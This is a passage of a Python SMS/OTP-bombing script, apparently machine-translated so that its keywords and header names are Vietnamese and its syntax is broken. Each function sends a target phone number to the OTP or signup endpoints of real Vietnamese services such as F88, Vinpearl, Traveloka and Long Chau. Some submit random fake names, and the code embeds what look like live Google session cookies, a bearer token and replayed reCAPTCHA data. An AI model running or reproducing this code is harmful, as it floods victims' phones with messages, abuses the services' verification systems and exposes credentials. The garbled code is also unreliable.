        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'không xác định',
        'x-city-id': '50',
        'x-lozi-client': '1',
    }

    dữ liệu json = {
        'mã quốc gia': '84',
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data)

    



định nghĩa send_otp_via_F88(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://f88.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://f88.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'Tên đầy đủ': generate_random_name(),
        'Điện thoại': sdt,
        'Mã Quận': '024',
        'Mã Tỉnh': '02',
        'AssetType': 'Xe hơi',
        'IsChoose': '1',
        'Mã cửa hàng': '',
        'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
        'Kiểu biểu mẫu': 1,
    }

    phản hồi = yêu cầu.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data)
    




định nghĩa send_otp_via_spacet(sdt):
    bánh quy = {
        '__Secure-3PAPISID': 'hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf',
        '__Secure-3PSID': 'g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076',
        'NID': '516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2w B7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN 8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEO KXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79b zaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5j XEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4Ya JT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jh rJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFeKgyA_8gwt8-CI _DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h 72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9Wh sU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex',
        '__Bảo mật-3PSIDTS': 'sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA',
        '__Secure-3PSIDCC': 'AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
    }

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/x-protobuf',
        # 'cookie': '__Secure-3PAPISID=hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf; __Secure-3PSID=g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076; NID=516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO _2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmY TJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFf EOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd7 9bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq 5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4 YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5 jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8- CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9 h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9W hsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex; __Bảo mật-3PSIDTS=sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA; __Bảo mật-3PSIDCC=AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
        'dnt': '1',
        'nguồn gốc': 'https://www.google.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&c o=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    tham số = {
        'k': '6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT',
    }

    dữ liệu = '\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsD fY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32W Ol9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNx cgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nY dTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUedKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM- AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624 YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOoo GVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\ x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bð\x01\x18\x01*>\n\b\b\x01\x10Õ\x01\x18ù\x02\n\b\b\x02\x10¬\x8a\x02\x18:\n\x0e\b\x04\x10ç\x8a\x02\x18ù\x01*\x03\x10¸`\n\b\b\x02\x10¤\x93\x05\x18X\n\x0e\b\x04\x10ý\x93\x05\x18\x96\x01*\x03\x10»n'.encode()

    phản hồi = yêu cầu.post('https://www.google.com/recaptcha/api2/clr', params=params, cookies=cookies, headers=headers, data=data)


    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA',
        'captchat': '03AFcWeA6FD9EelBdsrVKHbdBJeFirlLDqs6uUyjoSlEpOPu0kW1MpuxZq0WIDH3ZG2BNcm-geCeDFoN_ttxSy_fri8OhUZyNBztp-bQIKX3Nkxy8DTI23SIvXiY4deERRTn648ujmGof9n64xZPqqszck0WxmJDoVR302TlgZRffLW98h06B-G5OxSQazLtC0Sp1BrxwnRxZ8QqY-hFZJs622LIW7iHOdEu-szSTW8zfXKx34bAQULS9 zs2LfL7u7V8p1U4TNOjm6oQy1O2L3_i4sZAgUPl64LEKDX5nGwP6G-622G99MlF-jys_iWxxBaGJJjR_XrCRiYy_S2MmHPiR1vmHYU6XhK3d3LemE1vZm5ZTGXT1k aHt6PoqrRYkq7x7BFy8i5_I-e3WhKc4uRF6ZTve35n-iR8TpbuUsWCTX05ofVz6HTliRwcH_UITx4CHovH51Fuf0ko9Q5PFdevOieOLMIH-txiPmaFbTEdo-7lXQ8 uOvilc5Q7lMSKMIPqwKW73NEtUHgX56vCv6stbOIUeTp83n3oDcTi33WBnQhtPbqt2CXdmheoPB8bXy0tNPE4hsNTXEgdegwPzgZVe5Mt_m_AdTJYj9tZTi6NHKbzMytlt8LVhVW9PQyvaH6RyDznWp4sP5ggOQTwdy6CRieWf5S10IxlgEAI2Jfx43OxrWA_bc4X6F4JxOBSE7feyIbXDHpOQYNa7rMwrPbELE9YQVJS6RlUPOAnol0_q b0ez6Ajx-rF8QzBKphGaiOJsqYfADpVQluBkQVrLsGFUbh_XlvI8TUtfJzNKOFe7o0rXqOjfdVC8uRqPZY1fbS9QT7TlJVfXdfDBKlHLw3E5plm3-5zZIAyDMQFr8GJLgRgnsCAp3Qf0im-wjRQSONR1MwBumNho2MH039zwiDgVWc50BqFiCvhhsSdxhz_gMjAjvM_TDawV8PyAxesgrDRKzrUA3A4qFYxDK8dPKOd5MQt6wGn7ZmmbkL C2cfBK5P7AKiMynlHm07P_b_T1eCyDl_NvcVsGF9p9OlE1jx7pkqIf2dT6ZLIS467Sk_XgjbG4hZy17520iK6AntQheXkfyhKxAEUrL06_VlU0cpSupjCw2tlaAMM efkZOxZYP0g9LHKMe2DgT5hPwyJAXwbUlQagul4_mI2aWnxRh4Nzrpweqa8QrM2HpVxZtkrBGYko5lmw3-fiUTvsA-QzX6MVf_q1Ltzw8Un-YdZTEIM0ZxZkTvAdp YyDKSrjR9ZVOjHK7qFhM0VdtmiUXHccTsrv88Y_UJbDkOaHHf7GfcwPBnwDdflVRKsllc2rRTpxdNI-ZwnDBHW0_2t2q8XPR0sTNea_cAl8Luvf95e--WWkVN70MUXq9a5ruwzFRvMS8EHz1VIicMd3OloLnO0zdOZ-bcifucDJD1MSJ_lCj1KdSs4Uh5YYv2iLdd_F5xS8_rupL4_2mtE3t4YXqwqmGMRkIUriEtCT9KwT9YSR2JMeBRP Mm9LAyiWvNhMb4GNE0wYgKpWMtFGk0n7vUL2d4C_HXvm4HYecb56mPFqOlfUVxFVnuyHVRIDZXcGgQpPnbck3Gj-hM859anXjlkTQS_iEFkgv1odXZw0W6I9HxkXa AzsfPQF-sZAQsG1a2AeS_9tt9fuZdSz5_0L2Mdwd-Nx8laf77R6pr2G4AwoaLxc3v6PfS9lUh5L5DprhCUftJVWcbr4x_SBeIl_cv_E0wE1TP0kp-ZlMZ0ENFnDeb QiGabeVZMIhpNIXT9Z_G5LOGKr5UOCkIWUsisZH1WPz0bXfEKYB2VxQVzcJe0kAoJj_71CRkeWFdLxGiC0hhorobwC0gx5GXkb_kBKrCxKzpE4FVANQIBUrbsx3a5enmbdd06UUrnfHQstTUE_YSLkUY1iZvMqHUM3gG74mhS71c0-BcEMisBfAI_UiLKaBTUdS_nOMW8f8QsN4AZxO_Es67NDYIy65fv-s3aXyo2J5EFo3pBfSDFhpZR',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://spacet.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://spacet.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu json = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://api.spacet.vn/www/user/phone', headers=headers, json=json_data)
    

def gửi_otp_qua_vinpearl(sdt):


    bánh quy = {
        '__cf_bm': 'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVek VNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
        '__cfruid': '3f11778af16256a63eb265af0f726daceeb866de-1722350965',
    }

    tiêu đề = {
        'chấp nhận': 'hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,hình ảnh/svg+xml,hình ảnh/*,*/*;q=0.8',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': '__cf_bm=ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw; __cfruid=3f11778af16256a63eb265af0f726daceeb866de-1722350965',
        'dnt': '1',
        'ưu tiên': 'tôi',
        'người giới thiệu': 'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia -diem-du-lich-ha-long-lam-say-long-du-khach',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'hình ảnh',
        'sec-fetch-mode': 'không có cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    phản hồi = yêu cầu.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', cookie=cookies, headers=headers)


    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'chấp nhận-ngôn ngữ': 'vi-VN',
        'access-control-allow-headers': 'Chấp nhận, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
        'ủy quyền': 'Người mang không xác định',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://booking.vinpearl.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://booking.vinpearl.com/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-display-currency': 'VND',
    }

    dữ liệu json = {
        'kênh': 'vpt',
        'tên người dùng': sdt,
        'loại': 1,
        'OtpKênh': 1,
    }

    phản hồi = yêu cầu.đăng(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=tiêu đề,
        json=dữ liệu json,
    )

    


def send_otp_via_traveloka(sdt):
    # Kiểm tra và chuyển đổi số điện thoại
    nếu sdt.startswith('09'):
        sdt = '+84' + sdt[1:]

    bánh quy = {
        'tv-repeat-visit': 'đúng',
        'mã quốc gia': 'VN',
        'tv_user': '{"authorizationLevel":100,"id":null}',
        'aws-waf-token': '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
        'tvl': 'Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS 1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7 MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy',
        'tivi': 'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe 65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
        '_dd_s': 'rum=0&expire=1722352252222&logs=1&id=a1a90fe7-fce8-48b0-9100-5f789ab941af&created=1722351314461',
    }

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://www.traveloka.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-domain': 'người dùng',
        'x-route-prefix': 'vi-vn',
    }

    dữ liệu json = {
        'các trường': [],
        'dữ liệu': {
            'userLoginMethod': 'PN',
            'tên người dùng': sdt,
        },
        'clientInterface': 'máy tính để bàn',
    }

    phản hồi = yêu cầu.post('https://www.traveloka.com/api/v2/user/signup', cookie=cookies, headers=headers, json=json_data)
    



def send_otp_via_dongplus(sdt):


    tiêu đề = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'ert': 'DP:f9adae3150090780ee8cfac00fc7cc13',
        'nguồn gốc': 'https://dongplus.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://dongplus.vn/user/registration/reg1',
        'rt': '2024-07-30T22:25:19+07:00',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'điện thoại di động': sdt,
    }

    phản hồi = yêu cầu.post('https://api.dongplus.vn/api/v2/user/check-phone', headers=headers, json=json_data)
    


def send_otp_via_longchau(sdt):


    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type e': 'ứng dụng/json',
        'dnt': '1',
        'kênh đặt hàng': '1',
        'nguồn gốc': 'https://nhathuoclongchau.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'kênh x': 'EStore',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    phản hồi = yêu cầu.đăng(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    



def send_otp_via_longchau1(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'kênh đặt hàng': '1',
        'nguồn gốc': 'https://nhathuoclongchau.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'kênh x': 'EStore',
    }

    dữ liệu json = {
        'số điện thoại': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    phản hồi = yêu cầu.đăng(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    


